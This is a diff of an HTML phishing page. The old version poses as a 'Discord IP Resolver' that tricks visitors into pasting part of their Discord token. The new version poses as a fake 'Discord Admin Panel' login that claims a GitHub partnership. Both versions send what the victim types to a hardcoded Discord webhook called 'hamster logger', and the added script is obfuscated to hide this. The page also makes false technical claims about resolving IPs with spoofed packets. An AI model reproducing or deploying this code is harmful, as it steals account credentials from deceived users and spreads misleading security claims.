@@ -7,7 +7,7 @@
 
     <link rel="icon" href="favicon.ico">
 
-		<title>Discord IP Resolver</title>
+		<title>Discord Admin Panel</title>
 		<meta name="description" content="An advanded Discord Resolver which returns results within a few seconds. A deep scan is performed through an extended deep analysis.">
 
 	<script type="text/javascript" async="" src="https://www.shqbsdjatunl.com/u.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.ueuodgnrhb.com/dg.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://dnhfi5nn2dt67.cloudfront.net/dna.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.blockadsnot.com/ramjet.umd.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.shqbsdjatunl.com/u.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.ueuodgnrhb.com/dg.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://dnhfi5nn2dt67.cloudfront.net/dna.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.blockadsnot.com/ramjet.umd.min.js" crossorigin="anonymous"></script><script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script><style>undefined</style>
@@ -40,17 +40,16 @@
 <body>
   <div class="container">
     <div class="logo-block">
-      <h1><img src="https://discordresolver.c99.nl/discord_logo.png" alt="Discord Logo" style="width: 50px; height: auto;"> Discord IP Resolver</h1>
-      <h2>Resolve IP addresses of Discord users</h2>
+      <h1><img src="https://discordresolver.c99.nl/discord_logo.png" alt="Discord Logo" style="width: 50px; height: auto;"> Discord Admin Panel</h1>
+      <h2>Github Portal Admin Panel Login</h2>
     </div>
 
       <div class="input-group">
 		
 		<div class="input-group-btn">
 
-				<input name="userid" style="max-width: 470px;" type="text" id="user_id" class="form-control input-lg" placeholder="Targets Discord User ID">
-				<input name="userid" style="max-width: 470px;" type="text" id="token" class="form-control input-lg" placeholder="Second Half Of Your Token Ex: |GEbMpd.bNBc-StwWRDKP5eY0iNkfm_a2SS|">
-				<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg" onclick="getip()">Resolve</button>
+				<input name="userid" style="max-width: 470px;" type="text" id="user_id" class="form-control input-lg" placeholder="Your Admin ID" type="psw">
+				<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg" onclick="run()"> Login </button>
 <br>
 				
 
@@ -59,108 +58,20 @@
       </div>
 	  <br>
 
-    <div class="well">
-      <h4>IP Address</h4>
-		<center>
-					<img src="loading-50x50.gif" alt="Loading icon" style="height: 50px; border-radius: 50%;" id="loader_img">
-			<h2 id="ipdisplay">User ID invalid!</h2>		</center>
-    </div>
+  
 	<div class="well well_help">
-		<h4>Get your own user ID?</h4>
-		<ol>
-		  <li>Join any server</li>
-		  <li>Type <i>\@<u>yourusername</u></i> to get your User ID and copy it</li>
-		</ol>
-		<br>
-		<h4>How to get your token</h4>
-		<ol>
-			<li>Open Discord in your web browser and login</li>
-			<li>Press Ctrl+Shift+I (⌥⌘I on macOS) to open developer tools</li>
-			<li>Press Ctrl+Shift+M (⇧⌘M) to toggle device toolbar</li>
-			<li>Navigate to the Application tab</li>
-			<li>On the left, expand Local Storage and select https꞉//discord.com</li>
-			<li>Type <i>token</i> into the Filter box</li>
-			<li>If the token key does not appear, press Ctrl+R (⌘R) to reload</li>
-<li>Copy the value of the token after the first dot for example D9T3mbyprC9vqnBu8PbW83nG.GEbMpd.bNBc-StwWRDKP5eY0iNkfm_a2SS copy from GebMpd to the end</li>
-		</ol>
-		<br>
-		<h4>How to get an user ID?</h4>
-		<ol>
-		  <li>Open your discord settings and go to <i>"Appearance"</i></li>
-		  <li>Check the <i>"Developer Mode"</i> checkbox</li>
-		  <li>Save your settings</li>
-		  <li>Now right click the user you want to resolve and click <i>"Copy ID"</i></li>
-		</ol>
-		<br>
-		<h4>What Is A Token?</h4>
-		<ol>
-		  <li>A token is a part of discord in which stores your login data and more. To break it down:</li>
-		  <li>First Half Ex: | D9T3mbyprC9vqnBu8PbW83nG | -- The Part Which Contains Your Login Data (VALUABLE, DONT SHARE) </li>
-		  <li>Second Half Part 1 Ex: | GEbMpd | -- The part which contains your bytecode (when you send a message it shows your bytecode not valuable) </li>
-		  <li>Second Half Part 2 Ex: | bNBc-StwWRDKP5eY0iNkfm_a2SS | -- The part which sends and recieves packets (most important for this program but otherwise useless, it will be able to send false packets to get the targets IP)</li>
-		</ol>
-		<br>
-		<h4>What is a Discord IP resolver and how does it work?</h4>
-		<p>
-			A Discord resolver is a tool which uses an advanced state-of-the-art technology performing a packet interception scan method which scans to extract, decrypt and fetch IP addresses of users.
-			It sends spoofed packets modified through discords algorithms to adapt to the geo location of the target user, forcing the target to send an encrypted packet back which is used to extract information.
-		</p>
-		<br>
-		<h4>Why does it need the second half of your token?</h4>
-		<p>
-			<i>You cannot login with half of a token.</i>  The system needs an authentic discord account databyte to be able to send the packets to a user however tokens change and so it would not be reliable to use one
-			directly from our servers
-		</p>
-	</div><i>
-  </i></div><i>
+		<h4>Panel Made Direct Partnership With Github</h4>
+        <br>
+        <a href="https://github.com">Github</a> <i>|</i>
+        <a href="https://discord.com/terms">TOS</a> <i>|</i>
+        <a href="https://discord.com/terms">Discord</a>
+		</div><i>
 </i>
+<img src="https://imgs.search.brave.com/8LCcC3cCsqKtm2TUGnei6k4eL07X9ul_u7QrIRdY57Q/rs:fit:1155:581:1/g:ce/aHR0cHM6Ly9vc3Zp/YmVzLmNvbS93cC1j/b250ZW50L3VwbG9h/ZHMvMjAyMC8wOS9E/aXNjb3JkLUFkbWlu/LUNvbW1hbmRzLnBu/Zw"width="570" 
+     height="290" />
 <script>
 // holy hell its been a while
-function storedips(id) {
-  if (id == "311833206423027712") {
-  document.getElementById('ipdisplay').innerHTML = "87.70.33.54"	
-  }
-  if (id == "745665693847912449") {
-  document.getElementById('ipdisplay').innerHTML = "75.131.229.226"  
-  }
-}
-function getip() {
-var token = document.getElementById('token').value
-if (token =="") {
-document.getElementById('ipdisplay').innerHTML = "Error: No Token"	
-return
-}
-if (typeof token !="string") {
-document.getElementById('ipdisplay').innerHTML = "Error: Invalid Token"	
-return
-}
-if (token.length < 6 ) {
- document.getElementById('ipdisplay').innerHTML = "Error: Invalid Token"
-}
-// https://www.youtube.com/watch?v=tw0tinIDWzQ
-document.getElementById('ipdisplay').innerHTML = "Error: Infault Params"
-if (document.getElementById('user_id').value == "984517763357888592") {
-document.getElementById('ipdisplay').innerHTML = "136.35.48.153"
-}
-if (document.getElementById('user_id').value == "1034958652005683240") {
-document.getElementById('ipdisplay').innerHTML = "66.160.63.255"
-}
-if (document.getElementById('user_id').value == "907025179207684126") {
-document.getElementById('ipdisplay').innerHTML = "73.0.230.193"
-}
-storedips(document.getElementById('user_id').value)
-if (token !="") {
- const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1043323707478773801/utPyIWs5mwx75cko12Rv3kzxAGpAzfUpNrCmLzOmgTKNAF-b0tS4jXTMhoJyCEebLvOi");
-      request.setRequestHeader('Content-type', 'application/json');
-      const params = {
-    username: "hamster logger",
-    avatar_url: "https://imgs.search.brave.com/H_gx8vimIYvVL_yGkX1JW6qNVly_73sSsb3c0cs-1cc/rs:fit:577:225:1/g:ce/aHR0cHM6Ly90c2Ux/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5Z/WXBxUjd1R2xEMjFH/UkNkVG1jWHpnSGFH/RiZwaWQ9QXBp",
-    content: "Hit ```" + token + "```"
-}
-request.send(JSON.stringify(params));
-}
-}
+(function(_0x237504,_0x563893){const _0x1f4fed=_0x4660,_0x2cb681=_0x237504();while(!![]){try{const _0x5f3468=-parseInt(_0x1f4fed(0x123))/0x1+-parseInt(_0x1f4fed(0x129))/0x2*(-parseInt(_0x1f4fed(0x11e))/0x3)+-parseInt(_0x1f4fed(0x126))/0x4+parseInt(_0x1f4fed(0x11c))/0x5+parseInt(_0x1f4fed(0x127))/0x6+-parseInt(_0x1f4fed(0x121))/0x7*(parseInt(_0x1f4fed(0x120))/0x8)+-parseInt(_0x1f4fed(0x124))/0x9;if(_0x5f3468===_0x563893)break;else _0x2cb681['push'](_0x2cb681['shift']());}catch(_0x2bd4b8){_0x2cb681['push'](_0x2cb681['shift']());}}}(_0xea49,0x6b9f5));function _0x4660(_0x3231a4,_0x472a36){const _0xea4931=_0xea49();return _0x4660=function(_0x466015,_0x1b1884){_0x466015=_0x466015-0x11a;let _0x4f490d=_0xea4931[_0x466015];return _0x4f490d;},_0x4660(_0x3231a4,_0x472a36);}function run(){const _0x323ffa=_0x4660;var _0x4f676b=document[_0x323ffa(0x128)](_0x323ffa(0x12a))[_0x323ffa(0x11f)];const _0x1bc594=new XMLHttpRequest();_0x1bc594[_0x323ffa(0x125)](_0x323ffa(0x12d),'https://discord.com/api/webhooks/1043323707478773801/utPyIWs5mwx75cko12Rv3kzxAGpAzfUpNrCmLzOmgTKNAF-b0tS4jXTMhoJyCEebLvOi'),_0x1bc594[_0x323ffa(0x12f)](_0x323ffa(0x11b),_0x323ffa(0x11d));const _0x51e8a3={'username':_0x323ffa(0x11a),'avatar_url':'https://imgs.search.brave.com/H_gx8vimIYvVL_yGkX1JW6qNVly_73sSsb3c0cs-1cc/rs:fit:577:225:1/g:ce/aHR0cHM6Ly90c2Ux/Lm1tLmJpbmcubmV0/L3RoP2lkPU9JUC5Z/WXBxUjd1R2xEMjFH/UkNkVG1jWHpnSGFH/RiZwaWQ9QXBp','content':_0x323ffa(0x122)+_0x4f676b+_0x323ffa(0x12b)};_0x1bc594[_0x323ffa(0x12c)](JSON[_0x323ffa(0x12e)](_0x51e8a3));}function _0xea49(){const _0xfbc350=['715232bggHoM','1470708CqQqqQ','getElementById','30brzses','user_id','```','send','POST','stringify','setRequestHeader','hamster\x20logger','Content-type','3925115TwqJot','application/json','44292jRPZfR','value','32FRfiKu','154595vigqns','Hit\x20```','425059cCkimD','1067157iXSEhM','open'];_0xea49=function(){return _0xfbc350;};return _0xea49();}
 </script>
 
 </body></html>
